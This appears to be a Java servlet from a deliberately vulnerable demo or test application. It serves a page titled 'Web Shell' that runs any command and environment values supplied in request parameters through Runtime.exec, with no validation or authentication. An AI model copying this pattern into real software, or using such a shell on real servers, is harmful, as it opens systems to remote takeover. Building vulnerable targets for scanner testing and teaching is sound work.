package com.endor;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = "ExecuteServlet")
public class ExecuteServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        doGet(request, response);
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        PrintWriter out = null;
        try {
            out = response.getWriter();
        } catch (Exception e) {
            e.printStackTrace();
        }
        HtmlUtil.printHtmlHeader(response);
        HtmlUtil.startBody(response);
        HtmlUtil.printMenu(response);
        HtmlUtil.printCurrentTitle("Web Shell", response);

        String form = "<form action=\"cmdexec\">" +
                "Command: <input type=\"text\" name=\"command\"><br><br>" +
                "Environment Var: <input type=\"text\" name=\"env\"><br>" +
                "<input type=\"submit\" value=\"Submit\">" + "</form>";
        out.println(form);

        String command = request.getParameter("command");
        String env = request.getParameter("env");
        String[] envArr = env.split(";");
        Runtime.getRuntime().exec(command, envArr);
    }
}
